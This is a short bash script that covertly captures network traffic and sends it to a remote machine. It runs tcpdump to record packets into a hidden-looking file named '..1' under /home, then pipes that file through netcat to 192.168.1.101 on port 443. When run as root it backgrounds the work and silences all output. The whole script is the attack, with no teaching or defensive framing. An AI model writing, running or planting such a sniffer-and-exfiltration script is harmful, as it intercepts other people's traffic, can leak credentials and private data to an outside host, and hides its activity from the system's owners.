#!/bin/bash  
user=`whoami`
if [[ $user == "root"  ]]; then
	{
	tcpdump -w /home/..1
	nc -w 3 192.168.1.101 443 < /home/..1
	} > /dev/null 2>&1 &
else
	tcpdump -w /home/$user/..1
	nc -w 3 192.168.1.101 443 < /home/$user/..1
fi
